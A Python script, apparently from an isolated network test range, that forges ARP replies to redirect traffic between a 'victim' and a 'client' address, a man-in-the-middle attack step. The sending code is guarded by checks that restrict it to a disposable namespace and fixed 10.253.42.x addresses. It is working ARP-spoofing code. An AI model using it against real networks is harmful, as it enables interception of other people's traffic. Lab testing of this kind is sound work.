"""ARP redirection for *fixed*, newly created, disconnected test namespaces.

Never provide arbitrary addresses or interfaces. This intentionally exercises
real same-L2 ARP behavior but cannot be used with campus target parameters.
"""
from __future__ import annotations

import ipaddress
import json
import os
import socket
import struct
import subprocess
import sys
import time
from pathlib import Path


def _mac_bytes(value: str) -> bytes:
    parts = value.strip().split(":")
    if len(parts) != 6:
        raise ValueError("invalid MAC")
    return bytes(int(part, 16) for part in parts)


def _guard() -> None:
    # The tool is invoked only inside the isolated veth namespace constructed
    # by run.sh. Extra guardrails complement, not replace physical isolation.
    if os.getenv("MON_RANGE_NAMESPACE") != "isolated-veth-only":
        raise RuntimeError("the disposable namespace runner is required")
    if os.stat("/proc/self/ns/net").st_ino == os.stat("/proc/1/ns/net").st_ino:
        raise RuntimeError("cannot run in initial network namespace")
    data = json.loads(subprocess.check_output(
        ["ip", "-j", "addr", "show", "dev", "eth0"], text=True, timeout=2,
    ))
    addresses = [
        item.get("local") for iface in data for item in iface.get("addr_info", [])
        if item.get("family") == "inet"
    ]
    if addresses != ["10.253.42.30"]:
        raise RuntimeError("wrong namespace or interface")
    if subprocess.check_output(
        ["ip", "-4", "route", "show", "default"], text=True, timeout=2,
    ).strip():
        raise RuntimeError("default route present; refusing to run")


def build_arp_reply(
    sender_mac: str, claimed_ip: str, receiver_mac: str, receiver_ip: str
) -> bytes:
    if claimed_ip not in {"10.253.42.10", "10.253.42.20", "10.253.42.21"}:
        raise ValueError("refusing non-disposable claimed IP")
    if receiver_ip not in {"10.253.42.10", "10.253.42.20", "10.253.42.21"}:
        raise ValueError("refusing non-disposable receiver IP")
    source = _mac_bytes(sender_mac)
    target = _mac_bytes(receiver_mac)
    ethernet = target + source + struct.pack("!H", 0x0806)
    arp = struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2)
    arp += source + ipaddress.IPv4Address(claimed_ip).packed
    arp += target + ipaddress.IPv4Address(receiver_ip).packed
    return ethernet + arp


def main() -> None:
    _guard()
    if len(sys.argv) != 5:
        raise ValueError("arguments: victim_ip victim_mac client_ip client_mac")
    victim_ip, victim_mac, client_ip, client_mac = sys.argv[1:]
    if victim_ip not in {"10.253.42.20", "10.253.42.21"}:
        raise ValueError("victim IP not on the disposable bridge")
    if client_ip != "10.253.42.10":
        raise ValueError("client IP not on disposable bridge")
    my_mac = Path("/sys/class/net/eth0/address").read_text().strip()
    frames = [
        build_arp_reply(my_mac, victim_ip, client_mac, client_ip),
        build_arp_reply(my_mac, client_ip, victim_mac, victim_ip),
    ]
    with socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806)) as sock:
        sock.bind(("eth0", 0))
        for _ in range(4):
            for frame in frames:
                sock.send(frame)
            time.sleep(0.25)
    print(json.dumps({
        "type": "ATTEMPTED_ARP_REDIRECTION",
        "claimed_victim": victim_ip, "client": client_ip,
        "attacker_mac": my_mac,
        "claim": "ARP frames sent; MITM not proven until traffic path verified",
    }))


if __name__ == "__main__":
    main()
